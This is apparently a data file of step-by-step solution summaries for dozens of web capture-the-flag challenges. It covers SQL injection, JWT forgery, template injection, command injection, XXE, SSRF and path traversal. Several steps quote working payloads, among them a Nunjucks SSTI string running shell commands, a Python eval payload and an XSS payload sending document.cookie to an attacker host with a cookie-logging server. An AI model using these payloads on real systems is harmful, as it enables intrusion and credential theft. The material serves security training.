    "Check if the Header 'x-captcha-state' is set.",
    "Check if the body JSON value 'solution' exists.",
    "Check if the body JSON value 'solution' is equal to the expected CAPTCHA.",
    "Understand that if the expected value does not match 'solution'.",
    "Identify that the JWT field 'failed' is set to 'true'.",
    "Understand that if the expected value does match.",
    "Identify that a new CAPTCHA is generated.",
    "Realize that the flag can be attained with more than 1000 CAPTCHA solves.",
    "Understand the CAPTCHA generating code.",
    "Identify that the code uses random numbers to make the CAPTCHA text.",
    "Attempt a brute-forcing approach.",
    "Try out all remaining expected values.",
    "Identify the problem with brute force.",
    "Identify that the JWT success counter is reset to 0 if the old token is invalid.",
    "Identify that the JWT expiry was not extended for failed solving attempts.",
    "Work out bugs in the Python code.",
    "Attempt to refactor the code.",
    "Limit the try range.",
    "Consider another solution.",
    "Identify that the solution involves predicting the random numbers generated.",
    "Identify that the random numbers generated are not cryptographically secure.",
    "Visited the website.",
    "Observed output similar to standard Linux commands.",
    "Noticed the output of 'List Storage' command runs 'df -h'.",
    "Attempted accessing 'http://IP:PORT/?command=ls'.",
    "Confirmed command injection challenge.",
    "Viewed source code and observed 'shell_exec' usage with 'santa_mon.sh' script.",
    "Recognized input appending pattern to '/santa_mon.sh'.",
    "Noticed the 'sanitize' function removes spaces from input.",
    "Examined source code of 'santa_mon.sh' program.",
    "Confirmed buttons trigger standard Linux commands.",
    "Noted execution of argument as command.",
    "Found 'ups_status' and 'restart_ups' commands return output from local web server.",
    "Checked output of 'List Processes' command and identified 'python3 /root/ups_manager.py'.",
    "Reviewed source code of 'config/ups_manager.py' revealing the HTTP server with endpoints for 'ups_status', 'restart_ups', and '/get_flag'.",
    "Chose to craft a spaceless command injection payload.",
    "Planned to execute 'curl http://localhost:3000/get_flag' to obtain output through the webpage.",
    "Enclosed payload in double quotes for PHP.",
    "Constructed command '/santa_mon.sh \"curl http://localhost:3000/get_flag\"'.",
    "Executed the modified command and obtained the flag output from the server.",
    "Finalized the payload as 'http://IP:PORT/?command=%22curl${IFS}http://localhost:3000/get_flag%22'.",
    "Examine the source code.",
    "Identify that 'RS256' and 'HS256' algorithms are allowed for decryption in 'challenge/helpers/JWTHelper.js'.",
    "Recognize the potential JWT exploit (CVE-2016-5431/CVE-2016-10555).",
    "Create an account on the website.",
    "Access the browser's developer tools.",
    "Copy the 'session' cookie.",
    "Choose JWT.io or jwt_tool.py as the decoding tool.",
    "Decode the cookie using the selected tool.",
    "Inspect the decoded JWT.",
    "Identify the encoded public key in the JWT.",
    "Edit the JWT.",
    "Add the RS256-to-HS256 exploit to the JWT.",
    "Gain access as an admin user.",
    "Execute the RS256-to-HS256 exploit using python3 jwt_tool.py.",
    "Access the browser's developer tools.",
    "Replace the JWT token with the admin token.",
    "Gain admin access.",
    "Inspect 'challenge/routes/index.js' file for SSTI vulnerability.",
    "Inspect 'challenge/helpers/CardHelper.js' file for SSTI vulnerability.",
    "Identify the potential SSTI vulnerability.",
    "Exploit the SSTI vulnerability using ninjucks.",
    "Extract the flag from the '/flag' file.",
    "Craft and insert the payload '{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('cat /flag*')\")()}}' into the exploit.",
    "The website is a simple login page.",
    "Inspect the source code of the website.",
    "Identify the `database.sql` file in the source code.",
    "Verify that the `database.sql` file contains password hashes for a manager and admin user.",
    "Use CrackStation to decrypt the hashed passwords.",
    "Verify the obtained credentials: `manager:bigsanta!` and `admin:tryharder`.",
    "Try logging in using `manager:bigsanta!` credentials.",
    "Try logging in using `admin:tryharder` credentials.",
    "Observe the post-login page.",
    "Identify a list of toys and some other properties.",
    "Review the source code in `database.sql` file again.",
    "Identify that the flag is in the same database as the toys, but its approved value is set to 0.",
    "Inspect the `challenge/routes/index.js` file.",
    "Identify the `/api/toylist` endpoint and its behaviour.",
    "Realize that logging in as admin is necessary to access the flag.",
    "Reinspect the source code with attention to the user authentication process.",
    "Identify a potential vulnerability to SQL injection.",
    "Fetch various SQL injection payloads from [swisskyrepo/PayloadsAllTheThings GitHub repository.",
    "Attempt using various SQL injection payloads on the login page.",
    "Identify a working payload with username `admin' -- ` and any password.",
    "Log in using the working payload and reveal the hidden flag: `HTB{1nj3cti0n_1s_in3v1t4bl3}`.",
    "Examine the 'challenge/index.js' file in the source code zip.",
    "The application connects to a sqlite database ('const db = new Database('toy_workshop.db');'), so inspect 'database.js'.",
    "'database.js' lets you add and read items from the database. The query variable control is possible via the website, but SQL injection is unsuccessful.",
    "Examine the 'challenge/routes/index.js' file. We find an '/api/submit' endpoint which the frontend sends user data.",
    "This function adds our user provided query to the database and then calls 'bot.readQueries(db)'.",
    "We cannot reach the '/queries' endpoint as the IP address required is 127.0.0.1, any other IP is redirected to '/'.",
    "Inspect 'challenge/bot.js' to understand 'bot.readQueries(db)' function. It reveals that the bot imports puppeteer, a headless browser controlled via JavaScript, holds the flag, loads the application home page, sets the 'flag' cookie, visits the '/queries' endpoint, and then exits.",
    "This is a stored cross-site scripting vulnerability, where we can send a malicious script through the frontend to the database and when a user visits the '/queries' page, the server sends the malicious code to the user.",
    "Our malicious script grabs the current cookies and redirects to our webpage with these cookies as parameters in the request.",
    "We use a common XSS code: '<script>document.location='http://<ATTACKER_SERVER>?c='+document.cookie;</script>' to redirect to our webpage by changing the 'document.location' and setting the 'c' argument to 'document.cookie', which contains the current page's cookies.",
    "We need an actively running server to receive this request and log the cookie.",
    "A Python Flask application, does this in 'xss-cookie-stealer.py'. This script defines one route, '/', which reads the 'c' parameter in the request URL, opens a file called 'cookies.txt', writes the contents of 'c' parameter to that file, and then redirects to 'https://google.com'.",
    "We run this server on all interfaces '0.0.0.0' on port '16361'.",
    "You can run this script anywhere that is internet accessible, port forward port '16361' or deploy on Google Cloud. But, the easiest method is to use ngrok.",
    "Create account at ngrok, download the application, and login.",
    "Start the Flask python server with 'python xss-cookie-stealer.py' and then run '/ngrok http 16361'.",
    "Ngrok will display a URL in the form 'http://<subdomain>.ngrok.io'.",
    "Input your ngrok URL into the malicious payload. For example, if ngrok URL is 'http://92832de0.ngrok.io', then the payload should be '<script>document.location='http://92832de0.ngrok.io?c='+document.cookie;</script>'",
    "Finally, input the payload into the frontend for the application.",
    "Wait for a few seconds for the puppeteer instance to start and load the page.",
    "After this, you should see the flag in your Flask terminal and in the 'cookies.txt' file.",
    "Visit an online barcode generator website.",
    "Inject a SQL query into the barcode generation process.",
    "Configure the SQL injection to return all rows in the database.",
    "Access the website's file upload functionality.",
    "Select the generated barcode file for upload.",
    "Inspect the returned results after uploading the barcode.",
    "Navigate to the bottom of the results.",
    "Locate the flag within the results.",
    "Analyze the website.",
    "Discover it is running on Flask.",
    "Review the input form logic.",
    "Notice the use of Python's eval() function.",
    "Identify that eval() function is vulnerable.",
    "Realize it can be used to execute shell commands from within Python.",
    "Use the Python subprocess library's getoutput() function.",
    "Craft a payload to return the content of /flag/flag.txt.",
    "Submit the payload (__import__('subprocess').getoutput('cat /flag/flag.txt')).",
    "Submit the payload through the form.",
    "Receive the output displaying the flag.",
    "Examine GitHub repo linked in the challenge",
    "Confirm that the repo belongs to a user named Magpie Inc",
    "Find the source code file 'flagchecker.c' in the repo",
    "Analyze the source code of 'flagchecker.c'",
    "Explore other files in the repo",
    "Navigate to the '.github/workflows' directory",
    "Locate the file 'build_flag_checker.yml'",
    "Analyze the contents of 'build_flag_checker.yml'",
    "Open the 'build.sh' script referenced in the GitHub Actions file",
    "Identify the 1st command-line argument used as a value assigned to a macro",
    "Open the 'flaghash.sh' script",
    "Analyze the process in the script: making a cURL request, hashing the results with MD5, and setting the 'auth' cookie to the value of 'FLAG_AUTH' from secrets",
    "Investigate the GitHub Actions workflow runs",
    "Notice that the value of FLAG_AUTH is starred out",
    "Study the commit history",
    "Find a commit with the message 'Fix auth!!!'",
    "Investigate changes made in the 'Fix auth!!!' commit",
    "Discover that the 'auth' cookie was previously set in 'gethash.sh'",
    "Use curl command",
    "Use the previously hardcoded auth cookie value",
    "Retrieve the flag successfully",
    "Access the website.",
    "Inspect the source HTML.",
    "Attempt to read the required file.",
    "Note the blacklisted characters.",
    "Open the file index.html.",
    "Use the LaTeX function \\StrMid to isolate the '/' symbol.",
    "Write a LaTeX script.",
    "Define sections of the path to the flag.",
    "Read index.html.",
    "Isolate the '/' character.",
    "Build the path to the flag.",
    "Read the flag.",
    "View the LOG data.",
    "Ensure that `$to_check` is assigned the value `0`.",
    "Exploit PHP using loose comparison.",
    "Create a 8 byte file equivalent to the data in `cipher + 0xd34db33f`.",
    "Upload the created file.",
    "Perform XOR operation between the uploaded file and `cipher + 0xd34db33f`.",
    "Check if the XOR result is zero.",
    "Evaluate the if statement `0 == 'whatever the password is'`.",
    "The if statement evaluates to true.",
    "Echo back the flag.",
    "Download app.py",
    "Examine the render function",
    "Determine that template injection is possible",
    "Pass things in the textbox",
    "Input {{ state.flag }}",
    "Input {{ state }}",
    "Get the flag",
    "Open the website in a web browser",
    "View the HTML source code of the website",
    "Search for comments within the HTML source code",
    "Identify the first part of the flag within a comment",
    "Locate the style.css file within the website files",
    "Open the style.css file",
    "Search for comments within the style.css file",
    "Identify the second part of the flag within a comment",
    "Install and open Dirb tool",
    "Enter the website URL in Dirb",
    "Run Dirb to scan for hidden directories or files",
    "Analyze and review the Dirb scan results",
    "Access the specified path in the website",
    "Open the final.txt file in the path",
    "Identify the third part of the flag within the file contents",
    "Take the first part of the flag from step 2",
    "Take the second part of the flag from step 3",
    "Take the third part of the flag from step 5",
    "Combine all three parts of the flag together",
    "Enter the website.",
    "Encounter a login page.",
    "Type a random base username and password for the login.",
    "See a page notifying about an incorrect login.",
    "Suggest to visit recently acquired companies.",
    "Notice that one of the mentioned company names points to 'Robots.txt'.",
    "Visit the robots.txt page for the site.",
    "Find a message about using an unsupported browser, more specifically Internet Explorer 6.01.",
    "Acquire the User-Agent string for Internet Explorer 6.01.",
    "Change the browser's user agent to IE 6.01 through developer tools in the browser.",
    "Reload the website page with the new user-agent.",
    "Find a message containing a 'secret key' for the cookies.",
    "Identify the 'secret key' for the site's cookies: flour_sugar_chocolate_and_lotsalove.",
    "Go to 'Inspect' -> 'Storage' -> 'Cookies'.",
    "Get the cookie's value.",
    "Decode the session data from the cookie using Base64 decoding on a site like cyberchef.",
    "Identify that you need change the 'admin' field to 'true'.",
    "Note that you need the secret key due to Flask's hash based on session data, timestamp, and the secret key.",
    "To find the session cookie, set the session's 'admin' field to 'true'.",
    "Run a script with the site's 'secret key' included.",
    "Use the new session cookie to log into the site.",
    "Intercept an HTTP request or use a cookie editor tool.",
    "Input the new cookie.",
    "Press 'login' on the login page.",
    "Access the site and find the flag.",
    "Search for Robots.txt file.",
    "Inspect website's code.",
    "Discover admin login page.",
    "Perform login.",
    "Receive cookie as a result of successful login.",
    "Inspect the cookie.",
    "Identify the 'admin' field and its value.",
    "Change the value of the 'admin' field to 'true'.",
    "Get redirected to the flag page.",
    "Open the webpage in a web browser",
    "Open the inspection tools in the web browser",
    "Navigate to the sources tab in the inspection tools",
    "Locate and open the JavaScript file",
    "Find the desired location in the JavaScript file",
    "Set a breakpoint at the desired location",
    "Reload or refresh the webpage",
    "Verify that the flag animation is frozen",
    "Identified that 'Cheap' can be bought by entering a valid credit card.",
    "Attempted to purchase 'flag' but failed.",
    "Discovered a suspicious 'data' parameter in the URL.",
    "Noticed that three successful purchases of 'cheap' had the same prefix.",
    "Observed that the prefix changed in the unsuccessful purchase.",
    "Deduced that the suffix of 'c1' and 'cp1' are the same.",
    "Inferred that the suffixes contain information about the product name and the purchase status.",
    "Attempted to decode the data contents.",
    "Unsuccessful in decoding the data contents.",
    "Created a Python script for a brute-force attack on the prefix.",
    "Combined portions of failed and successful purchase data strings.",
    "Made HTTP GET requests to the provided URL.",
    "The brute-force attack was successful.",
    "Visited the URL provided by the successful attack and obtained the flag.",
    "Examined the website's '.git' folder",
    "Accessed files such as '.git/HEAD'",
    "Used dumper from GitTools to inspect the git repo",
    "Directory wasn't directly browsable or clonable",
    "Inspected the 'flag.php' file and its history",
    "Found no relevant information",
    "Analyzed the source code for potential flaws",
    "Realized the asserts in 'index.php' were in strings",
    "Indicated potential 'eval' being done on the string",
    "Used the page string as '' and die(show_source('templates/flag.php')) or ''",
    "Caused the source of 'flag.php' file to be revealed",
    "Ran code using URL 'http://web.chal.csaw.io:8000/?page=%27%20and%20die(show_source(%27templates/flag.php%27))%20or%20%27'",
    "Acknowledged that one should never let user input be 'eval'ed in any way",
    "Identify the vulnerable 'report' admin page",
    "Recognize the SQL injection vulnerability in the 'id' parameter",
    "Observe the usage of MySQL",
    "Make the decision to use a UNION SELECT based query",
    "Plan to obtain information from MySQL special tables",
    "Encounter difficulties determining the number of columns",
    "Attribute the difficulties to browser extension issues",
    "Utilize the group_concat() function",
    "Obtain all entries in a column as a single row",
    "Execute a SQL query via URL manipulation",
    "Test each column value",
    "Execute a SQL query via URL manipulation",
    "Obtain table names from information_schema.tables",
    "Execute a SQL query via URL manipulation",
    "Obtain column names from information_schema.columns",
    "Execute a final SQL query",
    "Retrieve the flag from the 'flag' column in the 'flag' table",
    "Identify that the login site is vulnerable to SQL injection",
    "Realize that the login site has filters applied to the quotation marks",
    "Use a backslash as username",
    "Use '' OR 1=1;#' as password for SQL injection",
    "Login as admin using SQL injection",
    "Discover that the site is also vulnerable to Local File Inclusion (LFI)",
    "Use LFI to access the code of the 'delete' resource",
    "Use LFI to access the code of the 'flag' resource in the 'deleted' folder",
    "Identify that the flag was formed by computing the MD5 hash of the username, password and a salt",
    "Use a Python script to brute force the password",
    "Log in again with the deduced password to get the flag",
    "Visited the challenge link",
    "Read the information about logging in via POST and using json request",
    "Executed the cURL command",
    "Constructed the POST request with 'user' and 'pass' parameters",
    "Set the values of 'user' and 'pass' as 'karma'",
    "Sent the POST request",
    "Received the response",
    "Extracted the jwt token from the response",
    "Decrypted the jwt token using jwt.io",
    "Obtained the payload from the decrypted jwt token",
    "Noted the payload as {'user':'guest'}",
    "Accessed the robots.txt file of the website",
    "Identified the '/flag' endpoint in the robots.txt file",
    "Constructed a POST request to the '/flag' endpoint",
    "Sent the POST request",
    "Received the response",
    "Analyzed the response",
    "Identified the need for a valid jwt token",
    "Passed the earlier jwt token as parameter",
    "Received the response",
    "Analyzed the response",
    "Identified the need for admin credentials",
    "Edited the existing jwt token",
    "Changed the payload to {'user':'admin'} using jwt.io",
    "Constructed a POST request to the '/flag' endpoint",
    "Included the newly edited admin jwt token in the request",
    "Sent the POST request",
    "Received the response",
    "Extracted the flag from the response",
    "Open the provided challenge link",
    "View the login form",
    "Submit the form with random user credentials",
    "Observe the website redirection to '/flag'",
    "Read the message displayed: 'Not admin, no flag for you'",
    "Check the cookies of the webpage",
    "Find a 'token' key in the cookies",
    "Verify that the 'token' key contains a JWT",
    "Go to jwt.io",
    "Analyze the JWT",
    "Note that the token uses the RS256 algorithm",
    "Understand the requirement of a private and public key",
    "Access '/robots.txt' on the website",
    "Locate a PRIVATE KEY within the file",
    "Locate the private key",
    "Create a token",
    "Apply the signature to the token",
    "Build the token using NodeJS",
    "Use the 'jsonwebtoken' library",
    "Set the 'user' payload to 'admin'",
    "Use the retrieved private key for signing",
    "Specify the 'RS256' algorithm for signing",
    "Use the newly generated token as a cookie",
    "Navigate to /flag",
    "Read the presented flag",
    "Read the challenge description.",
    "Identified the potential for a JWT key confusion attack.",
    "Logged in with a random value.",
    "Inspected cookies.",
    "Found a `token` cookie.",
    "Checked the value of the `token` cookie on jwt.io.",
    "Realised that the token was using the RS256 algorithm.",
    "Accessed the `/robots.txt` file.",
    "Found a public key in the `/robots.txt` file.",
    "Concluded that a JWT confusion attack is required.",
    "Identified the need to change the Asymmetric Cipher Algorithm to Symmetric Cipher Algorithm.",
    "Built an HMAC(HS256) token.",
    "Used the public key as a secret for the HMAC token.",
    "Crafted a token with 'admin' as the user.",
    "Used the crafted token as a cookie.",
    "Attempted to access the /flag directory.",
    "Successfully obtained the flag.",
    "Enter junk value to log in.",
    "Inspect browser cookies.",
    "Open jwt.io website.",
    "Enter token value.",
    "Verify token using jwt.io.",
    "Identify the algorithm used as HS256.",
    "Analyze the weak encryption.",
    "Deduce the need for brute-forcing the secret key.",
    "Open jwt_tool.",
    "Specify 'rockyou.txt' as the dictionary file.",
    "Initiate brute force attack on the token.",
    "Retrieve the found secret_key 'redraider'.",
    "Create a new token using HS256 algorithm.",
    "Set secret_key as 'redraider'.",
    "Assign user value as 'admin'.",
    "Navigate to the /flag URL.",
    "Set the token as a cookie.",
    "Retrieve the flag.",
    "Search for the source code of the web application",
    "Identify that the web application has registration, login, and readfile functionalities",
    "Perform a login using the web application",
    "Obtain a token after successful login",
    "Use the obtained token to perform a readfile operation",
    "Read the content of the `68696e742e747874` file, which is the hex representation of hint.txt",
    "Analyze the response from the previous step",
    "Identify a hint suggesting a length extension attack",
    "Note that the password length is less than 30 characters",
    "Determine the technology stack of the web application",
    "Verify that the web application is using node.js",
    "Realize that the system should have a `package.json` file",
    "Research the hashpumpy function",
    "Apply the hashpumpy function to retrieve the contents of package.json",
    "Confirm that the password length is `22`",
    "Inspect the User.js file",
    "Discover the usage of `node-serialize` in User.js",
    "Recognize that the npm package `node-serialize` is vulnerable to node-deserialization RCE attack",
    "Analyze the application's token verification process",
    "Examine the `decrypter` function",
    "Note the usage of the `unserialize` function",
    "Recognize that the `unserialize` function can lead to Remote Code Execution (RCE)",
    "Analyze the requirements for exploiting RCE",
    "Understand that a valid signature is needed to exploit RCE",
    "Identify that the valid signature can be obtained from the .env file",
    "Locate the .env file",
    "Retrieve the value of AUTH_SECRET from the .env file",
    "Develop a Python script",
    "Implement the necessary steps to exploit the vulnerability",
    "Demonstrate successful Remote Code Execution (RCE)",
    "Utilize the developed exploit",
    "Read the content of the /etc/flag.txt file",
    "Retrieve the flag",
    "Analyze the URL 'http://35.207.189.79/pyserver/server.py'.",
    "Determine that the code has a vulnerable functionality.",
    "Identify that query parameters are not properly sanitized.",
    "Discover the requirement to login as an 'admin' user.",
    "Identify the need for a 'token' to perform certain actions.",
    "Examine the 'init_db' function.",
    "Discover that the 'DB_SECRET' is stored in another table.",
    "Create a SQL injection payload.",
    "Use the payload to extract flag data from the server.",
    "Conduct communication with the server.",
    "Include the SQL injection payload in a complete request.",
    "Extract data from the server.",
    "Inspect the server response.",
    "Search for the flag within the server response.",
    "Access the provided URL.",
    "Study the given codes on the page which are written in PHP.",
    "Identify that the code is reading an HTTP header.",
    "Identify that the code is using the HTTP header to construct a file path.",
    "From the PHP, realize that there’s a potential path traversal vulnerability.",
    "Realize that the potential path traversal vulnerability can be exploited.",
    "Understand that '../' is replaced in the code.",
    "Understand that '....//' can be used to bypass the replacement of '../'.",
    "Make several attempts to exploit the path traversal vulnerability.",
    "Input 'Accept-Language: ....//....//....//....//flag' in the HTTP header.",
    "Receive in response an 'image' encoded in base64.",
    "Decode the base64 string.",
    "Reveals the flag '35c3_this_flag_is_the_be5t_fl4g'.",
    "Access the link 'http://35.207.189.79/pyserver/server.py'.",
    "Analyze the provided Python server script.",
    "Identify the first function that sets specific server response headers if the request is 127.0.0.1.",
    "Identify the second function that is used to proxy images.",
    "Extract the main execution function from the Python script.",
    "Identify the server's functioning port and host from the extracted main execution function.",
    "Note that 'Content-Type' is strictly checked in the header-setting function.",
    "Identify that '.jpg', '.png', and '.gif' extensions are blacklisted in the header-setting function.",
    "Conclude that an image is necessary to exploit the service.",
    "Select 'img/paperbots.svg' from the images provided by the server.",
    "Confirm that the selected image can be used to exploit the service.",
    "Prepare a GET request to the URL 'http://35.207.189.79/api/proxyimage?url=http://127.0.0.1:8075/img/paperbots.svg'.",
    "Send the prepared GET request, making the server believe that the request is coming from the same host.",
    "Receive the server's response.",
    "Identify the flag in the 'X-Localhost-Token' header in the received server response.",
    "Analyse the challenge",
    "Identify that the website can't send double opt-in emails",
    "Realize that a user can be registered",
    "Realize that the 'magic code' needed to login won't be received via email",
    "Use the URL 'http://35.207.189.79/api/login'",
    "Analyse the response of the authentication API",
    "Notice that the 'magic code' is present",
    "Identify that the 'magic code' is present in the payload returned by the server",
    "Use the retrieved 'magic code' to complete the login",
    "Complete the login on the website",
    "Identify that a cookie is set after login",
    "Identify that the cookie is set with the flag '35C3_LOG_ME_IN_LIKE_ONE_OF_YOUR_FRENCH_GIRLS'",
    "Visit the given URL http://35.207.91.38/robots.txt.",
    "Observe a disallowed directory: /backup/.DS_Store.",
    "Visit http://35.207.91.38/backup/.DS_Store.",
    "Download the .DS_Store file.",
    "Use the script available at https://github.com/lijiejie/ds_store_exp.",
    "Extract hidden data from the .DS_Store file.",
    "Find the flag in the backup/b/a/c/flag.txt file.",
    "Access the website.",
    "Specify the URL http://35.207.120.163.",
    "Access the website from the challenge.",
    "Submit a note.",
    "Include spaces in the note.",
    "Observe the error message.",
    "Submit a note.",
    "Use only characters from a-z and A-Z in the note.",
    "Observe that the submission is accepted.",
    "Receive a note ID.",
    "Receive a note PW.",
    "Receive a link to the note.",
    "Analyze the website's HTML.",
    "Find the comment indicating the source code location.",
    "Identify that the source code is located at /src.tgz.",
    "Download the source code.",
    "Extract the source code from /src.tgz.",
    "Study the downloaded source code.",
    "Identify that 'flag.txt' can be read.",
    "Find that the read endpoint is '/admin'.",
    "Find the code in 'view.php'.",
    "Identify the password check code.",
    "Understand that the code retrieves a note.",
    "Realize that the 'id' parameter can be manipulated.",
    "Understand that the program only casts the integer part of 'id'.",
    "Create a crafted 'id' parameter.",
    "Craft the parameter as '5779715767432985082/../../admin'.",
    "Confirm the first 'if' statement would be passed.",
    "Confirm the second 'if' statement would be passed.",
    "Understand that PHP only considers the integer part of 'id' for the cast.",
    "Ensure the 'file_get_contents' instruction is used.",
    "Understand that it performs an HTTP GET call.",
    "Construct the backend endpoint as '$BACKEND/get/5779715767432985082/../../admin'.",
    "Understand the interpretation of the GET call.",
    "Realize the endpoint changes to '$BACKEND/admin'.",
    "Retrieve 'flag.txt'.",
    "Retrieve the flag.",
    "Observe the flag content as '35C3_M1Cr0_S3rvices_4R3_FUN!'.",
    "Access the initial webpage",
    "Observe a PHP snippet",
    "Analyze the PHP code for potential vulnerabilities",
    "Determine irrelevance of the first 'If' statement",
    "Find opportunity to bypass the second 'If' statement",
    "Use the same value for 'pass' URL parameter and User-Agent",
    "Exploit PHP's type conversion",
    "Approach the third 'If' statement",
    "Observe use of secret flag within a MD5 calculation",
    "Deduce the possible range of the value of $_[0]",
    "Test single characters from '0' to 'f'",
    "Use each character as the value for both 'pass' and the User-Agent header",
    "Identify 'b' as the character that successfully returns the flag",
    "Retrieve the flag '35c3_password_saltf1sh_30_seconds_max'",
    "Visited the challenge website",
    "Checked the source code of the homepage",
    "Found the first part of the flag 'accessdenied{1_w3nt_thr0ug' in an HTML comment",
    "Found a clue in the same comment to check 'd4rks0c1ety' page for the rest of the flag",
    "Visited 'https://codeiiest.github.io/d4rks0c1ety.html'",
    "Checked the source code of the 'd4rks0c1ety' page",
    "Found the second part of the flag '_th1s_w3bs1t3}' in an HTML comment",
    "Joined the two parts of the flag to form 'accessdenied{1_w3nt_thr0ugh_th1s_w3bs1t3}'",
    "Access the website homepage",
    "Observe the presence of a login form",
    "Analyze the browser cookies",
    "Identify a cookie named 'admin_id : 0'",
    "Locate the 'admin_id' cookie",
    "Modify the value of 'admin_id' cookie to '1'",
    "Refresh the page",
    "Observe the flag after refreshing the page",
    "Analyzed the browser console.",
    "Found an error 'jquery-3.3.1.min.js:2 Uncaught SyntaxError: Unexpected token {'",
    "Visited the reported portion of the JavaScript file.",
    "Found the flag 'accessdenied{1t_w4s_h1dd3n_h3r3_594a9sd}' in the JavaScript file.",
    "Access the website home page.",
    "Notice a strange message of INSTRUO team's love for cookies.",
    "Analyze the browser cookies.",
    "Find a cookie with the name 'flag'.",
    "Identify a value in Base64 within the cookie.",
    "Decode the Base64 cookie value.",
    "Reveal the flag within the decoded value.",
    "Gain understanding of the game mechanics.",
    "Recognize the objective and rules of the game.",
    "Note the time limit and required number of clicks.",
    "Acknowledge that squares should be avoided while clicking.",
    "Realize the random placement of squares in each round.",
    "Analyze the obfuscated front-end source code.",
    "Identify element and class names within the code.",
    "Associate recognized components with their intended functionalities.",
    "Examine the provided back-end source code.",
    "Identify the transmission of positions to the client.",
    "Recognize the first position in the JSON array as the winning position.",
    "Utilize the network tab in the browser's developer tools.",
    "Or, use Wireshark for analyzing the HTTP traffic.",
    "Inspect the format of request packets.",
    "Analyze the format of response packets.",
    "Create a client script based on packet structure knowledge.",
    "Implement logic to determine the winning position.",
    "Utilize the requests library in Python for communication.",
    "Code the script to play the game repeatedly.",
    "Execute the developed script.",
    "Monitor the output of the script.",
    "Search for the flag within the script's output.",
    "Visit the website mentioned in the challenge",
    "Analyze the challenge title for possible XSS vulnerability",
    "Access the URL `https://xmas.2020.chall.actf.co/post`",
    "Craft a message with an XSS attack using an `img` tag",
    "Post the crafted message",
    "Observe the website returning a code",
    "Access the URL `https://xmas.2020.chall.actf.co/report`",
    "Send the code to the site administrator",
    "Set up a server using the `nc` command to listen for admin cookies",
    "Wait for the admin cookies to be caught",
    "Access the URL `https://xmas.2020.chall.actf.co/admin`",
    "Include the caught admin cookies in the request",
    "Send the request and receive a response",
    "Extract the flag from the HTML content of the response",
    "Extract the flag from the provided string",
    "Visit the provided URL.",
    "View the website contents.",
    "Find the file named configs.zip on the webpage.",
    "Download the file named configs.zip.",
    "Extract the configs.zip file.",
    "Analyze the file named apache_ctf.conf.",
    "Identify the rule within the configuration file.",
    "Replace any 'secret' tags with the word 'Protected'.",
    "Make a GET request to /secret.html.",
    "Observe that the contents of 'secret' tags are replaced with 'Protected'.",
    "Make a GET request with a 'Range' HTTP header to exfiltrate the original /secret.html page.",
    "Observe within the content of the page.",
    "Identify the 'secret' tag which contains the flag.",
    "Received the URL https://poems.asisctf.com/ as part of the challenge.",
    "Visited the URL which led to a website containing a list of books.",
    "Identified two actions 'an excerpt' and 'read online' on the website.",
    "Noticed that 'read online' opens a link from an unrelated domain.",
    "Explored the HTML source of the webpage.",
    "Discovered a treasury.js file in the HTML source.",
    "Determined that the treasury.js file can help understand the actions performed on the site.",
    "Figured out that the homepage is loaded as a result of an HTTP GET request to '/books.php?type=list'.",
    "Noticed an excerpt button on the webpage.",
    "Observed that clicking on the excerpt button makes an HTTP GET request to '/books.php?type=excerpt&id=1'.",
    "Identified that the 'read online' button opens a new window upon clicking.",
    "Realized that the new window redirects to a unique link for each book.",
    "Analyzing the behavior of the website led to a suspicion that the web application might be vulnerable to SQL injection.",
    "Defined SQL injection as the manipulation of a query to interact with a website's database.",
    "Attempted to induce an SQL injection by inputting the URL 'https://poems.asisctf.com/books.php?type=excerpt&id=0%27%20or%20id=%271'.",
    "Established the potential presence of an SQL injection vulnerability when the result of the book with 'id=1' printed.",
    "Input the URL 'https://poems.asisctf.com/books.php?type=excerpt&id=0%27%20union%20select%201%20%23' to further test for vulnerabilities.",
    "Encountered a weird error, further hinting at the presence of an SQL injection vulnerability.",
    "Recognized from the error that the website is likely reading XML data from a database.",
    "Decided to use SQLmap, a tool for automating the detection and exploitation of SQL injection flaws.",
    "Implemented SQLmap to exploit the potential SQL injection vulnerability.",
    "Analyzed the results from the SQLmap.",
    "Concluded from the SQLmap results that there are two databases available: 'ASISCTF' and 'information_schema'.",
    "Continued to interpret the results from SQLmap.",
    "Discovered in the SQLmap results that the 'ASISCTF' database has one table termed 'books'.",
    "Evaluated the structure of the 'books' table.",
    "Noticed that the 'books' table has two columns: 'id' and 'info'.",
    "Recognized that SQLmap only displays one entry for 'id' of 1.",
    "Continued to analyze the output from SQLmap.",
    "Discovered that a '<flag>' XML element is hidden in the 'books' table but not in the entry with 'id = 1'.",
    "Considered the possibility of output truncation by SQLmap.",
    "Found out that despite such constraints, the SQLmap successfully retrieved the flag 'ASIS{6e73c9d277cc0776ede0cbd36eb93960d0b07884}'.",
    "Considered the XML-related error spawned previously.",
    "Considered the hint provided into the <flag> element talking about a '/flag' file.",
    "Understood that the application can be exploited via a XXE attack.",
    "Crafted a malicious payload.",
    "Passed the payload via the SQL injection vulnerability.",
    "Used a 'UNION' operation for the SQL injection.",
    "Triggered the XML payload on the application.",
    "Conducted a remote file read operation.",
    "Constructed a payload to test the exploit.",
    "URL-encoded the payload.",
    "Created a malicious URL.",
    "Included the payload in the URL.",
    "Executed the URL.",
    "Successfully read the remote files.",
    "Used PHP filters.",
    "Read source code via base64 encoding.",
    "Created another payload.",
    "URL-encoded the new payload.",
    "Created a new malicious URL.",
    "Included the new payload in the URL.",
    "Executed the new URL.",
    "Resulted in a base64-encoded result.",
    "Decoded the base64 encoded result.",
    "Obtained the flag.",
    "Connect to the given URL.",
    "View the source code.",
    "Examine the source code.",
    "Search for 'eval' syntax.",
    "Identify 'eval' syntax on 'warmup' GET parameter.",
    "Note that 'warmup' GET parameter is strictly checked for.",
    "Research methods of bypassing strict checks.",
    "Focus on bypassing checks applied to 'warmup' GET parameter.",
    "Determine attacking strategy.",
    "Choose reading another HTTP GET parameter.",
    "Ensure the chosen parameter is non-alphanumeric.",
    "Implement research knowledge.",
    "Craft a payload.",
    "Implement bitwise XOR operation in PHP to bypass checks.",
    "Construct a payload.",
    "Ensure the payload commands execution of another GET parameter.",
    "Test the payload.",
    "Use 'phpinfo' page to check if the payload is operational.",
    "Complete the payload.",
    "Ensure the payload visualizes and reads contents of 'flag.php'.",
    "Break down the payload.",
    "First part constructs a string representation.",
    "Second part performs 'file_get_contents('flag.php').",
    "Final part performs variable dump (var_dump($_0)).",
    "Flag is output after successful execution of the attack.",
    "Analyze the HTML of the page.",
    "Discover a JavaScript script in the HTML.",
    "Access the obfuscated code at http://challenges.auctf.com:30022/authentication.js.",
    "Decode the initial array with base64 encoded strings in the JavaScript script.",
